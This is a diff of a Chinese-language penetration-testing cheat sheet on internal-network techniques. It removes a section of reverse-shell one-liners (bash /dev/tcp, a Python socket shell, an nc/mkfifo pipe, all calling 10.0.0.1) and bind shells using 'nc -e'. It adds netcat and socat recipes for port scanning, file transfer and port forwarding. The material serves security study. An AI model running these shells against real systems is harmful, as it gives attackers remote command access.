@@ -18,26 +18,37 @@
 - ssh通道
     - 端口转发
     - socks
-
-获取shell
-----------------------------------------
-- 常规shell反弹
-
-::
-
-    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-
-- 突破防火墙的imcp_shell反弹
-- 正向shell
-
-::
-
-    nc -e /bin/sh -lp 1234
-    nc.exe -e cmd.exe -lp 1234
+- nc
+    - 端口扫描
+	``nc -z -v -n 172.31.100.7 21-25``
+    - 聊天
+	``nc -l 1567``
+	``nc 172.31.100.7 1567``
+    - 文件传输
+	``nc -l 1567 < file.txt``
+	``nc -n 172.31.100.7 1567 > file.txt``
+    - 目录传输
+	``tar -cvf – dir_name | nc -l 1567``
+	``nc -n 172.31.100.7 1567 | tar -xvf -``
+    - 加密传输
+	``nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt``
+	``mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567``
+    - 端口转发
+	``nc -l 8000`` 
+	``cat /tmp/fifo | nc localhost 8000 | nc -l 9000 > /tmp/fifo`` 
+	``nc -n 192.168.1.102 9000`` 
+- socat
+    - 显示本地文件
+	``socat - /etc/sysctl.conf`` 
+    - 监听本地端口
+	``socat TCP-LISTEN:12345 -`` 
+    - UNIX DOMAIN域套接字转成TCP SOCKET
+	``socat TCP-LISTEN:12345,reuseaddr,fork UNIX-CONNECT:/data/deCOREIDPS/unix.domain`` 
+    - 端口转发
+	``对于所有15000端口的TCP访问，一律转发到 server.wesnoth.org:15000 上`` 
+	``socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15000,reuseaddr,fork,su=nobody TCP4:server.wesnoth.org:15000`` 
+	``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
+	``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
 
 内网文件传输
 ----------------------------------------
